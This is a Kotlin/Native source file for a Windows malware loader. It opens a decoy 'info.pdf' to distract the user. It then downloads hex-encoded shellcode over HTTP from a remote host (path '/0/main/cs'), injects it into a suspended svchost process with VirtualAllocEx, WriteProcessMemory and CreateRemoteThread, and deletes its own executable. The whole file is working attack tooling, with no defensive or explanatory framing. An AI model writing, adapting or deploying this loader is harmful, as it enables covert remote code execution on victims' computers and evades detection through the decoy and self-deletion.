package com.xhstormr.app

import kotlinx.cinterop.ByteVar
import kotlinx.cinterop.UIntVar
import kotlinx.cinterop.UShortVar
import kotlinx.cinterop.alloc
import kotlinx.cinterop.allocArray
import kotlinx.cinterop.convert
import kotlinx.cinterop.memScoped
import kotlinx.cinterop.ptr
import kotlinx.cinterop.readBytes
import kotlinx.cinterop.reinterpret
import kotlinx.cinterop.toCValues
import kotlinx.cinterop.toKString
import kotlinx.cinterop.value
import kotlinx.cinterop.wcstr
import platform.posix.BUFSIZ
import platform.posix.P_OVERLAY
import platform.posix.SEEK_END
import platform.posix.fclose
import platform.posix.fopen
import platform.posix.fread
import platform.posix.fseek
import platform.posix.ftell
import platform.posix.rewind
import platform.posix.spawnlp
import platform.posix.sprintf
import platform.windows.CREATE_SUSPENDED
import platform.windows.CreateProcessW
import platform.windows.CreateRemoteThread
import platform.windows.GetModuleFileNameW
import platform.windows.HttpOpenRequestW
import platform.windows.HttpSendRequestW
import platform.windows.INTERNET_FLAG_RELOAD
import platform.windows.INTERNET_SERVICE_HTTP
import platform.windows.InternetConnectW
import platform.windows.InternetOpenW
import platform.windows.InternetReadFile
import platform.windows.MAX_PATH
import platform.windows.MEM_COMMIT
import platform.windows.PAGE_EXECUTE_READ
import platform.windows.PAGE_READWRITE
import platform.windows.PROCESS_INFORMATION
import platform.windows.STARTUPINFO
import platform.windows.SW_SHOWNORMAL
import platform.windows.ShellExecuteW
import platform.windows.VirtualAllocEx
import platform.windows.VirtualProtectEx
import platform.windows.WriteProcessMemory
import kotlin.system.exitProcess

inline fun String.hex2byte() =
    this.chunked(2) { it.toString().toInt(16).toByte() }.toByteArray()

inline fun readFile(fileName: String): ByteArray? {
    val file = fopen(fileName, "rb") ?: return null
    try {
        fseek(file, 0, SEEK_END)
        val fileSize = ftell(file)
        rewind(file)

        memScoped {
            val bytes = allocArray<ByteVar>(fileSize)
            fread(bytes, 1.convert(), fileSize.convert(), file)
            return bytes.readBytes(fileSize)
        }
    } finally {
        fclose(file)
    }
}

inline fun downloadFile(host: String, port: Int, path: String): ByteArray? = runCatching {
    val hSession = InternetOpenW(null, 0.convert(), null, null, 0.convert())
    val hConnect = InternetConnectW(hSession, host, port.convert(), null, null, INTERNET_SERVICE_HTTP, 0.convert(), 0.convert())
    val hRequest = HttpOpenRequestW(hConnect, "GET", path, null, null, null, INTERNET_FLAG_RELOAD, 0.convert())
    HttpSendRequestW(hRequest, null, 0.convert(), null, 0.convert())

    var bytes = byteArrayOf()
    memScoped {
        val size = alloc<UIntVar>()
        val buf = allocArray<ByteVar>(BUFSIZ)
        while (true) {
            InternetReadFile(hRequest, buf, BUFSIZ, size.ptr)
            if (size.value.toInt() == 0) break
            bytes += buf.readBytes(size.value.toInt())
        }
    }
    return bytes
}.getOrNull()

fun main() {
    memScoped {
        val path = allocArray<UShortVar>(MAX_PATH)
        GetModuleFileNameW(null, path, MAX_PATH)
        ShellExecuteW(null, null, "info.pdf", null, path.toKString().substringBeforeLast('\\'), SW_SHOWNORMAL)
    }

    memScoped {
        val raw = downloadFile("1.1.1.1", 80, "/0/main/cs")?.decodeToString()?.trim()?.hex2byte() ?: exitProcess(0)
        val rawSize = raw.size

/*
        val ptr = VirtualAlloc(null, rawSize.convert(), MEM_COMMIT, PAGE_EXECUTE_READWRITE)!!
        memcpy(ptr, raw.toCValues().ptr, rawSize.convert())
        ptr.reinterpret<CFunction<() -> Unit>>().invoke()
*/

        val si = alloc<STARTUPINFO>()
        val pi = alloc<PROCESS_INFORMATION>()

        val protect = alloc<UIntVar> {
            value = PAGE_READWRITE.convert()
        }

        CreateProcessW(null, "svchost".wcstr.ptr, null, null, 0, CREATE_SUSPENDED, null, null, si.ptr, pi.ptr)
        val ptr = VirtualAllocEx(pi.hProcess, null, rawSize.convert(), MEM_COMMIT, protect.value)!!
        WriteProcessMemory(pi.hProcess, ptr, raw.toCValues().ptr, rawSize.convert(), null)
        VirtualProtectEx(pi.hProcess, ptr, rawSize.convert(), PAGE_EXECUTE_READ, protect.ptr)
        CreateRemoteThread(pi.hProcess, null, 0.convert(), ptr.reinterpret(), null, 0.convert(), null)
    }

    memScoped {
        val path = allocArray<UShortVar>(MAX_PATH)
        val args = allocArray<ByteVar>(MAX_PATH)
        GetModuleFileNameW(null, path, MAX_PATH)
        sprintf(args, """/c del "%s"""", path.toKString())
        spawnlp(P_OVERLAY, "cmd", args.toKString(), null)
    }
}
